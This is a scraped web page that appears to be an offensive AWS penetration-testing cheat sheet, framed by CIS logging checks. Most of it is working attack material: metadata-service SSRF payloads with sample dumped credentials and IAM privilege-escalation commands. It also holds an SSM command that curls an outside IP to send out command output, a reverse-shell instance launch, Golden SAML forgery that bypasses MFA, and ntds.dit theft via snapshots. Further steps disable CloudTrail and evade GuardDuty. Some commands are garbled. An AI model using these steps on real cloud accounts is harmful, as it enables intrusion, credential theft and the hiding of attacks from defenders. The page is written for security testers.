alarm exist for IAM policy changes Ensure a log metric filter and alarm exist for CloudTrail configuration changes Ensure a log metric filter and alarm exist for AWS Management Console authentication failures Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs Ensure a log metric filter and alarm exist for S3 bucket policy changes Ensure a log metric filter and alarm exist for AWS Config configuration changes Ensure a log metric filter and alarm exist for security group changes Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL) Ensure a log metric filter and alarm exist for changes to network gateways Ensure a log metric filter and alarm exist for route table changes Ensure a log metric filter and alarm exist for VPC changes References An introduction to penetration testing AWS - Graceful Security Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk My arsenal of AWS Security tools - toniblyx AWS Privilege Escalation method mitigation - RhinoSecurityLabs AWS CLI Cheatsheet - apolloclark Pacu Open source AWS Exploitation framework - RhinoSecurityLabs PACU Spencer Gietzen - 30 juil. 2018 Cloud security instance metadata - PumaScan Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018 AWS - Cheatsheet - @Magnussen amazon-guardduty-user-guide PenTest Finding Types - @awsdocs HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016 Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019 Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020 AWS API calls that return credentials - kmcquade" />
<meta property="og:description" content="Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services. Summary AWS Summary Training Tools AWS Patterns AWS - Metadata SSRF Method for Elastic Cloud Compute (EC2) Method for Container Service (Fargate) AWS API calls that return credentials AWS - Shadow Admin Admin equivalent permission AWS - Gaining AWS Console Access via API Keys AWS - Enumerate IAM permissions AWS - Mount EBS volume to EC2 Linux AWS - Copy EC2 using AMI Image AWS - Instance Connect - Push an SSH key to EC2 instance AWS - Lambda - Extract function’s code AWS - SSM - Command execution AWS - Golden SAML Attack AWS - Shadow Copy attack Disable CloudTrail Cover tracks by obfuscating Cloudtrail logs and Guard Duty DynamoDB Security checks References Training Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6 SadCloud - https://github.com/nccgroup/sadcloud Flaws - http://flaws.cloud Tools SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins Requires read-Only permissions over IAM service ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\SkyArk.ps1 -force PS C&gt; Start-AWStealth or in the Cloud Console PS C&gt; IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1’) PS C&gt; Scan-AWShadowAdmins ``` Pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set Requires AWS Keys ```powershell $ git clone https://github.com/RhinoSecurityLabs/pacu $ bash install.sh $ python3 pacu.py set_keys/swap_keys ls run [--keyword-arguments] run --regions eu-west-1,us-west-1 # https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details ``` Bucket Finder - Search for public buckets, list and download all files if directory indexing is enabled 1 2 3 4 5 6 7 8 9 10 11 wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2 ./bucket_finder.rb my_words ./bucket_finder.rb --region ie my_words US Standard = http://s3.amazonaws.com Ireland = http://s3-eu-west-1.amazonaws.com Northern California = http://s3-us-west-1.amazonaws.com Singapore = http://s3-ap-southeast-1.amazonaws.com Tokyo = http://s3-ap-northeast-1.amazonaws.com ./bucket_finder.rb --download --region ie my_words ./bucket_finder.rb --log-file bucket.out my_words Boto3 - Amazon Web Services (AWS) SDK for Python 1 2 3 4 5 6 7 8 9 import boto3 # Create an S3 client s3 = boto3.client(&#39;s3&#39;,aws_access_key_id=&#39;AKIAJQDP3RKREDACTED&#39;,aws_secret_access_key=&#39;igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED&#39;,region_name=&#39;us-west-1&#39;) try: result = s3.list_buckets() print(result) except Exception as e: print(e) Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100). Require: arn:aws:iam::aws:policy/SecurityAudit 1 2 3 4 5 6 $ pip install awscli ansi2html detect-secrets $ git clone https://github.com/toniblyx/prowler $ sudo apt install jq $ ./prowler -E check42,check43 $ ./prowler -p custom-profile -r us-east-1 -c check11 $ ./prowler -A 123456789012 -R ProwlerRole # sts assume-role Principal Mapper - A tool for quickly evaluating IAM permissions in AWS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 https://github.com/nccgroup/PMapper pip install principalmapper pmapper graph --create pmapper visualize --filetype png pmapper analysis --output-type text # Determine if PowerUser can escalate privileges pmapper query &quot;preset privesc user/PowerUser&quot; pmapper argquery --principal user/PowerUser --preset privesc # Find all principals that can escalate privileges pmapper query &quot;preset privesc *&quot; pmapper argquery --principal &#39;*&#39; --preset privesc # Find all principals that PowerUser can access pmapper query &quot;preset connected user/PowerUser *&quot; pmapper argquery --principal user/PowerUser --resource &#39;*&#39; --preset connected # Find all principals that can access PowerUser pmapper query &quot;preset connected * user/PowerUser&quot; pmapper argquery --principal &#39;*&#39; --resource user/PowerUser --preset connected ScoutSuite - Multi-Cloud Security Auditing Tool 1 2 3 4 5 $ git clone https://github.com/nccgroup/ScoutSuite $ python scout.py PROVIDER --help # The --session-token is optional and only used for temporary credentials (i.e. role assumption). $ python scout.py aws --access-keys --access-key-id &lt;AKIAIOSFODNN7EXAMPLE&gt; --secret-access-key &lt;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&gt; --session-token &lt;token&gt; $ python scout.py azure --cli s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files 1 2 3 4 5 $ git clone https://github.com/nccgroup/s3_objects_check $ python3 -m venv env &amp;&amp; source env/bin/activate $ pip install -r requirements.txt $ python s3-objects-check.py -h $ python s3-objects-check.py -p whitebox-profile -e blackbox-profile cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report 1 2 3 $ pip3 install --user cloudsplaining $ cloudsplaining download --profile myawsprofile $ cloudsplaining scan --input-file default.json weirdAAL - AWS Attack Library 1 2 3 python3 weirdAAL.py -m ec2_describe_instances -t demo python3 weirdAAL.py -m lambda_get_account_settings -t demo python3 weirdAAL.py -m lambda_get_function -a &#39;MY_LAMBDA_FUNCTION&#39;,&#39;us-west-2&#39; -t yolo cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments 1 2 3 4 5 6 7 8 9 10 11 git clone https://github.com/duo-labs/cloudmapper.git # sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli # You may additionally need &quot;build-essential&quot; sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli pipenv install --skip-lock pipenv shell report: Generate HTML report. Includes summary of the accounts and audit findings. iam_report: Generate HTML report for the IAM information of an account. audit: Check for potential misconfigurations. collect: Collect metadata about an account. find_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges dufflebag - Find secrets that are accidentally exposed via Amazon EBS’s “public” mode AWS Patterns | Service | URL | |————-|——–| | s3 | https://{user_provided}.s3.amazonaws.com | | cloudfront | https://{random_id}.cloudfront.net | | ec2 | ec2-{ip-seperated}.compute-1.amazonaws.com | | es | https://{user_provided}-{random_id}.{region}.es.amazonaws.com | | elb | http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 | | elbv2 | https://{user_provided}-{random_id}.{region}.elb.amazonaws.com | | rds | mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 | | rds | postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 | | route 53 | {user_provided} | | execute-api | https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} | | cloudsearch | https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com | | transfer | sftp://s-{random_id}.server.transfer.{region}.amazonaws.com | | iot | mqtt://{random_id}.iot.{region}.amazonaws.com:8883 | | iot | https://{random_id}.iot.{region}.amazonaws.com:8443 | | iot | https://{random_id}.iot.{region}.amazonaws.com:443 | | mq | https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 | | mq | ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 | | kafka | b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com | | kafka | {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com | | cloud9 | https://{random_id}.vfs.cloud9.{region}.amazonaws.com | | mediastore | https://{random_id}.data.mediastore.{region}.amazonaws.com | | kinesisvideo | https://{random_id}.kinesisvideo.{region}.amazonaws.com | | mediaconvert | https://{random_id}.mediaconvert.{region}.amazonaws.com | | mediapackage | https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel | AWS - Metadata SSRF AWS released additional security defences against the attack. :warning: Only working with IMDSv1. Enabling IMDSv2 : aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required. In order to usr IMDSv2 you must provide a token. 1 2 export TOKEN=`curl -X PUT -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot; &quot;http://169.254.169.254/latest/api/token&quot;` curl -H &quot;X-aws-ec2-metadata-token:$TOKEN&quot; -v &quot;http://169.254.169.254/latest/meta-data&quot; Method for Elastic Cloud Compute (EC2) Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/ 1 2 3 4 5 6 7 8 9 10 ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Extract the role’s temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ 1 2 3 4 5 6 7 8 9 { &quot;Code&quot; : &quot;Success&quot;, &quot;LastUpdated&quot; : &quot;2019-07-31T23:08:10Z&quot;, &quot;Type&quot; : &quot;AWS-HMAC&quot;, &quot;AccessKeyId&quot; : &quot;ASIA54BL6PJR37YOEP67&quot;, &quot;SecretAccessKey&quot; : &quot;OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2&quot;, &quot;Token&quot; : &quot;AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv&quot;, &quot;Expiration&quot; : &quot;2019-08-01T05:20:30Z&quot; } Method for Container Service (Fargate) Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ 1 2 3 4 5 JAVA_ALPINE_VERSION=8.212.04-r0 HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 1 2 3 4 5 6 7 { &quot;RoleArn&quot;: &quot;arn:aws:iam::953574914659:role/awesome-waf-role&quot;, &quot;AccessKeyId&quot;: &quot;ASIA54BL6PJR2L75XHVS&quot;, &quot;SecretAccessKey&quot;: &quot;j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt&quot;, &quot;Token&quot;: &quot;FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==&quot;, &quot;Expiration&quot;: &quot;2019-09-18T04:05:59Z&quot; } AWS API calls that return credentials chime:createapikey codepipeline:pollforjobs cognito-identity:getopenidtoken cognito-identity:getopenidtokenfordeveloperidentity cognito-identity:getcredentialsforidentity connect:getfederationtoken connect:getfederationtokens ecr:getauthorizationtoken gamelift:requestuploadcredentials iam:createaccesskey iam:createloginprofile iam:createservicespecificcredential iam:resetservicespecificcredential iam:updateaccesskey lightsail:getinstanceaccessdetails lightsail:getrelationaldatabasemasteruserpassword rds-db:connect redshift:getclustercredentials sso:getrolecredentials mediapackage:rotatechannelcredentials mediapackage:rotateingestendpointcredentials sts:assumerole sts:assumerolewithsaml sts:assumerolewithwebidentity sts:getfederationtoken sts:getsessiontoken AWS - Shadow Admin Admin equivalent permission AdministratorAccess 1 2 &quot;Action&quot;: &quot;*&quot; &quot;Resource&quot;: &quot;*&quot; ec2:AssociateIamInstanceProfile iam:CreateAccessKeyiam:CreateAccessKey : create a new access key to another IAM admin account 1 aws iam create-access-key –user-name target_user iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it 1 $ aws iam create-login-profile –user-name target_user –password &#39;|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(&#39; –no-password-reset-required iam:UpdateLoginProfile : reset other IAM users’ login passwords. 1 $ aws iam update-login-profile –user-name target_user –password &#39;|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(&#39; –no-password-reset-required iam:AttachUserPolicy, iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses 1 2 3 $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess iam:PutUserPolicy, iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities. 1 $ aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json iam:CreatePolicy : add a stealthy admin policy iam:AddUserToGroup : add into the admin group of the organization. 1 $ aws iam add-user-to-group –group-name target_group –user-name my_username iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account. 1 $ aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json iam:CreatePolicyVersion &amp; iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one. 1 2 $ aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default $ aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2 lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function. 1 $ aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint. 1 $ aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub iam:PassRole + ec2:CreateInstanceProfile/ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses. iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account. 1 2 3 4 # add ssh key $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456 # execute a reverse shell $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account. 1 2 $ aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py $ aws lambda invoke –function-name my_function output.txt Example of code.py 1 2 3 4 5 6 7 8 import boto3 def lambda_handler(event, context): client = boto3.client(&#39;iam&#39;) response = client.attach_user_policy( UserName=&#39;my_username&#39;, PolicyArn=&quot;arn:aws:iam::aws:policy/AdministratorAccess&quot; ) return response iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account. 1 $ aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub AWS - Gaining AWS Console Access via API Keys A utility to convert your AWS CLI credentials into AWS console access. 1 2 3 4 5 6 7 8 9 10 $&gt; git clone https://github.com/NetSPI/aws_consoler $&gt; aws_consoler -v -a AKIA[REDACTED] -s [REDACTED] 2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments... 2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic. 2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established. 2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session. 2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established. 2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler. 2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated! https://signin.aws.amazon.com/federation?Action=login&amp;Issuer=consoler.local&amp;Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&amp;SigninToken=[REDACTED AWS - Enumerate IAM permissions Enumerate the permissions associated with AWS credential set with enumerate-iam 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 git clone git@github.com:andresriancho/enumerate-iam.git pip install -r requirements.txt ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... 2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id &quot;AKIA...&quot; 2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked! 2019-05-10 15:58:01,537 - 21345 - [INFO] -- { &quot;RoleDetailList&quot;: [ { &quot;Tags&quot;: [], &quot;AssumeRolePolicyDocument&quot;: { &quot;Version&quot;: &quot;2008-10-17&quot;, &quot;Statement&quot;: [ { ... 2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked! 2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked! 2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked! 2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked! 2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked! AWS - Mount EBS volume to EC2 Linux :warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken. Head over to EC2 –&gt; Volumes and create a new volume of your preferred size and type. Select the created volume, right click and select the “attach volume” option. Select the instance from the instance text box as shown below : attach ebs volume 1 2 aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone aws ec2 attach-volume –-volume-id volume_id –-instance-id instance_id --device device Now, login to your ec2 instance and list the available disks using the following command : lsblk Check if the volume has any data using the following command : sudo file -s /dev/xvdf Format the volume to ext4 filesystem using the following command : sudo mkfs -t ext4 /dev/xvdf Create a directory of your choice to mount our new ext4 volume. I am using the name “newvolume” : sudo mkdir /newvolume Mount the volume to “newvolume” directory using the following command : sudo mount /dev/xvdf /newvolume/ cd into newvolume directory and check the disk space for confirming the volume mount : cd /newvolume; df -h . AWS - Copy EC2 using AMI Image First you need to extract data about the current instances and their AMI/security groups/subnet : aws ec2 describe-images --region eu-west-1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # create a new image for the instance-id $ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name &quot;AWS Audit&quot; --description &quot;Export AMI&quot; --region eu-west-1 # add key to AWS $ aws ec2 import-key-pair --key-name &quot;AWS Audit&quot; --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1 # create ec2 using the previously created AMI, use the same security group and subnet to connect easily. $ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids &quot;sg-6d0d7f01&quot; --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name &quot;AWS Audit&quot; --query &quot;Instances[0].InstanceId&quot; --region eu-west-1 # now you can check the instance aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 # If needed : edit groups aws ec2 modify-instance-attribute --instance-id &quot;i-0546910a0c18725a1&quot; --groups &quot;sg-6d0d7f01&quot; --region eu-west-1 # be a good guy, clean our instance to avoid any useless cost aws ec2 stop-instances --instance-id &quot;i-0546910a0c18725a1&quot; --region eu-west-1 aws ec2 terminate-instances --instance-id &quot;i-0546910a0c18725a1&quot; --region eu-west-1 AWS - Instance Connect - Push an SSH key to EC2 instance 1 2 3 # https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/ $ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq &quot;.[][].Instances | .[] | {InstanceId, KeyName, State}&quot; $ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds AWS - Lambda - Extract function’s code 1 2 3 4 # https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed $ aws lambda list-functions --profile uploadcreds $ aws lambda get-function --function-name &quot;LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY&quot; --query &#39;Code.Location&#39; --profile uploadcreds $ wget -O lambda-function.zip url-from-previous-query --profile uploadcreds AWS - SSM - Command execution :warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled. SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs): Windows Server 2008-2012 R2 AMIs published in November 2016 or later Windows Server 2016 and 2019 Amazon Linux Amazon Linux 2 Ubuntu Server 16.04 Ubuntu Server 18.04 Amazon ECS-Optimized 1 2 3 4 5 6 $ aws ssm describe-instance-information --profile stolencreds --region eu-west-1 $ aws ssm send-command --instance-ids &quot;INSTANCE-ID-HERE&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;IP Config&quot; --parameters commands=ifconfig --output text --query &quot;Command.CommandId&quot; --profile stolencreds $ aws ssm list-command-invocations --command-id &quot;COMMAND-ID-HERE&quot; --details --query &quot;CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}&quot; --profile stolencreds e.g: $ aws ssm send-command --instance-ids &quot;i-05b████████adaa&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;whoami&quot; --parameters commands=&#39;curl 162.243.███.███:8080/`whoami`&#39; --output text --region=us-east-1 AWS - Golden SAML Attack https://www.youtube.com/watch?v=5dj4vOqqGZw https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/ Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user’s password. This attack also bypasses any MFA requirements. Requirement: Token-signing private key (export from personal store using Mimikatz) IdP public certificate IdP name Role name (role to assume) 1 2 3 $ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml $ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 AWS - Shadow Copy attack Prerequisite: EC2:CreateSnapshot CloudCopy - https://github.com/Static-Flow/CloudCopy Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions Run &quot;Describe-Instances&quot; and show in list for attacker to select Run &quot;Create-Snapshot&quot; on volume of selected instance Run &quot;modify-snapshot-attribute&quot; on new snapshot to set &quot;createVolumePermission&quot; to attacker AWS Account Load AWS CLI with Attacker Credentials Run &quot;run-instance&quot; command to create new linux ec2 with our stolen snapshot Ssh run &quot;sudo mkdir /windows&quot; Ssh run &quot;sudo mount /dev/xvdf1 /windows/&quot; Ssh run &quot;sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user&quot; Ssh run &quot;sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user&quot; Ssh run &quot;sudo chown ec2-user:ec2-user /home/ec2-user/*&quot; SFTP get &quot;/home/ec2-user/SYSTEM ./SYSTEM&quot; SFTP get &quot;/home/ec2-user/ntds.dit ./ntds.dit&quot; locally run &quot;secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets&#39;, expects secretsdump to be on path Disable CloudTrail 1 $ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator Disable monitoring of events from global services 1 $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event Disable Cloud Trail on specific regions 1 $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west Cover tracks by obfuscating Cloudtrail logs and Guard Duty :warning: When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent. Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473) 1 2 3 4 5 boto3_session = boto3.session.Session() ua = boto3_session._session.user_agent() if &#39;kali&#39; in ua.lower() or &#39;parrot&#39; in ua.lower() or &#39;pentoo&#39; in ua.lower(): # If the local OS is Kali/Parrot/Pentoo Linux # GuardDuty triggers a finding around API calls made from Kali Linux, so let&#39;s avoid that... self.print(&#39;Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...&#39;) DynamoDB Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It’s a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second. list tables ```bash $ aws –endpoint-url http://s3.bucket.htb dynamodb list-tables { “TableNames”: [ “users” ] } 1 2 3 4 5 6 7 8 9 10 11 12 13 * enumerate table content ```bash $ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r &#39;.Items[]&#39; { &quot;password&quot;: { &quot;S&quot;: &quot;Management@#1@#&quot; }, &quot;username&quot;: { &quot;S&quot;: &quot;Mgmt&quot; } } Security checks https://github.com/DenizParlak/Zeus Identity and Access Management Avoid the use of the “root” account Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password Ensure credentials unused for 90 days or greater are disabled Ensure access keys are rotated every 90 days or less 